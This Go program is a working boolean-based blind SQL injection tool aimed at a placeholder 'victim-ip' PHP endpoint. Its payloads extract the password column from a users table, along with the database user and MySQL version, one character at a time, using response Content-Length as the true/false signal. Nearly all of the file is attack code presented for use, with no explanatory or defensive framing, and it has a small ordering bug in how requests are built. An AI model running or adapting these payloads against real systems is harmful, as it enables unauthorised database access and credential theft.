package main

import (
	"crypto/tls"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/valyala/fasthttp"
)

// PROXY address of proxy server e.g. burp
const PROXY string = "127.0.0.1:8090"

// HTTPRequest represents HTTP Request
type HTTPRequest struct {
	URL       string
	Method    string
	Body      []byte
	withProxy bool
}

// HTTPResponse represents the response returned by the server
type HTTPResponse struct {
	StatusCode int
	Headers    fasthttp.ResponseHeader
	Body       []byte
}

// Parameters for SQL Injection
var query string

func main() {

	// initialize struct
	request := HTTPRequest{
		URL:       "http://victim-ip/path/subpath/database.php?query=",
		Method:    "GET",
		Body:      []byte(""),
		withProxy: false,
	}

	// Extract password
	query = "AAAA')/**/or/**/(select/**/ascii((select/**/substring((select/**/password/**/from/**/users),$INDEX$,1))))/**/=$FUZZ$%23"

	// Extract Username
	query = "AAAA')/**/or/**/(select/**/ascii(substring((select/**/user()),$INDEX$,1)))=$FUZZ$%23"

	// Extract MySQL version
	query = "AAAA')/**/or/**/(select/**/ascii(substring((select/**/version()),$INDEX$,1)))=$FUZZ$%23"

	exfilterateData(request)

}

// Send HTTP Request
func sendHTTPRequest(request HTTPRequest) (HTTPResponse, error) {

	var err error

	req, res := fasthttp.AcquireRequest(), fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(res)

	var proxyClient *fasthttp.HostClient
	var normalClient *fasthttp.Client

	// Set URL
	req.SetRequestURI(request.URL)

	if request.withProxy {
		// with proxy
		proxyClient = &fasthttp.HostClient{
			Addr:      PROXY,
			TLSConfig: &tls.Config{InsecureSkipVerify: true},
		}
		err = proxyClient.Do(req, res)
	} else {
		// without proxy
		normalClient = &fasthttp.Client{
			TLSConfig: &tls.Config{InsecureSkipVerify: true},
		}
		err = normalClient.Do(req, res)
	}

	// Set HTTP Method
	switch request.Method {
	case "GET":
		req.Header.SetMethod(fasthttp.MethodGet)
	case "POST":
		req.Header.SetMethod(fasthttp.MethodPost)
		req.SetBody(request.Body)
	case "PUT":
		req.Header.SetMethod(fasthttp.MethodPut)
		req.SetBody(request.Body)
	case "DELETE":
		req.Header.SetMethod(fasthttp.MethodDelete)
		req.SetBody(request.Body)
	}

	if err != nil {
		color.Set(color.FgHiRed)
		fmt.Println("Could not connect to the server ", request.URL)
		fmt.Println(err)
		color.Unset()
	}

	response := HTTPResponse{
		StatusCode: res.StatusCode(),
		Body:       res.Body(),
		Headers:    res.Header,
	}

	return response, err

}

// Performs boolean based SQLI to exfiltrate data
// Response length is considered as boolean criteria
func exfilterateData(request HTTPRequest) {

	headerName := "Content-Length"

	baseURL := request.URL

	// Exfilterated data in string
	result := ""

	// Index for the substring in the SQL query
	index := 1

	// Start of scan
	start := time.Now()

	status := true

	for {

		if status {

			injectionString := strings.Replace(query, "$INDEX$", strconv.Itoa(index), -1)

			// Range over printable ASCII characters
			for i := 32; i <= 126; i++ {

				payload := strings.Replace(injectionString, "$FUZZ$", strconv.Itoa(i), -1)
				request.URL = baseURL + payload

				response, err := sendHTTPRequest(request)

				if err != nil {
					fmt.Println(err)
					os.Exit(1)
				}

				// Fetch the content length header
				contentLength, err := strconv.Atoi(fetchHeader(headerName, response.Headers))
				if err != nil {
					fmt.Printf("%s header not found\n", headerName)
				}

				if contentLength > 20 {
					// True condition
					result += string(i)
					index++
					fmt.Printf(string(i))
					break
				}

				if i == 126 {
					status = false
				}
			}

		} else {
			break
		}

	}
	// End of scan
	end := time.Now()
	elapsed := end.Sub(start)
	fmt.Println("Final Result = ", result)
	fmt.Println("Total time = ", elapsed)
}

func fetchHeader(headerName string, responseHeaders fasthttp.ResponseHeader) string {

	headers := strings.Split(responseHeaders.String(), "\n")
	var headerValue string

	for _, header := range headers {
		if strings.Contains(header, headerName) {
			headerValue = strings.TrimSpace(strings.Split(header, ":")[1])
			break
		}
	}

	return headerValue

}
